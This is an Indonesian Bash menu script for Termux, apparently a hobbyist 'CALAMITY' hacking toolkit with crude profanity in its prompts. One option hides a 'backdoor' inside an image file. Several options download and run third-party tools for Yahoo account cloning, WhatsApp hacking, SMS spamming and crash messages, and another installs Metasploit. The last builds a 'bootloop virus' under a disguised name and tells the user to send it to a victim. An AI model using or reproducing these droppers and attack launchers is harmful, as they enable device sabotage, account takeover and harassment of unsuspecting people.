#!/bin/bash
# TOOLS SEMENTARA SAMPAI 8 DULU MAS MBAK


g="\033[32;1m"
y="\033[33;1m"
ig="\033[34;1m"
r="\033[35;1m"
p="\033[37;1m"
c="\033[36;1m"
w="\033[39;1m"
r2='\033[31m'
i='$i'

echo -e -n $w "M3M3K > "
read tanya;
case $tanya in
1) echo "STEGANOGRAFI" | lolcat
   figlet "CALAMITY" | lolcat
   termux-setup-storage
   echo -e -n $r2 "Masukkan Backdor( dari sdcard ) > "
   read gambar;
   echo -e -n $r2 "File yang ingin disisipi (jpg,png) > "
   read bekdor;
   echo -e -n $w "Output file ( w saranin ext jpg,png ) > "
   read output;
   cat /sdcard/$gambar /sdcard/$bekdor >$output
   echo "DONE KONTOLLL HASIL DIDALAM FOLDER TOOLS INI DENGAN NAMA" $output | lolcat -a -d 500 ;;
2) echo "TUNGGU....." | lolcat
   figlet "CALAMITY" | lolcat
   pkg install python2
   pkg install git
   git clone https://github.com/pashayogi/SETAN
   cd SETAN
   python2 SETAN.py ;;
3) echo "TUNGGU......." | lolcat
   figlet "CALAMITY" | lolcat
   pkg install python2
   pkg install git
   git clone https://github.com/GUNAWAN18ID/cloning-yahoo
   cd clooning-yahoo
   python2 yahoo.py ;;
4) echo "TUNGGU......" | lolcat
   figlet "CALAMITY" | lolcat
   pkg install git
   pkg install ruby
   gem install lolcat
   pkg install git
   git clone https://github.com/muhammadfathul/VIRTEX 
   cd VIRTEX
   bash virtex.sh ;;
5) echo "TUNGGU......." | lolcat
   figlet "CALAMITY" | lolcat
   pkg install git
   pkg install bash
   git clone https://github.com/calamity22xc/hackwa
   cd hackwa
   bash install
   bash HackWhatsapp.sh ;;
6) echo "TUNGGU........" | lolcat
   figlet "CALAMITY" | lolcat
   pkg install git
   pkg install python
   git clone https://github.com/calamity22xc/spamsms
   cd spamsms
   ls ;;

7) echo "TUNGGU........." | lolcat
   figlet "CALAMITY" | lolcat
   pkg install unstable-repo
   cd $HOME
   pkg install metasploit
   figlet -f slant "DONE...." | lolcat
   ;;

8) echo "TUNGGU......." | lolcat
   figlet "CALAMITY" | lolcat
   echo -e $rw "VIRUS BOOTLOP BY CALAMITY"
   echo -e -n $w "MASUKKAN NAMA VIRUS > "
   read virus;
   echo -e -n $rw "NAMA VIRUS (SAMARKAN AGAR KORBAN TIDAK TAU ) > "
   read output;
   touch $virus
   cat bootlop.sh $virus >$output
   echo "DONE HASIL VIRUS TERSIMPAN DI FOLDER INI DENGAN NAMA" $output "TINGGAL KIRIM KE KORBAN" | lolcat 
   ;;

*) echo "PILH YANG BENER KNTL :V " | lolcat -a -d 500 ;;

esac
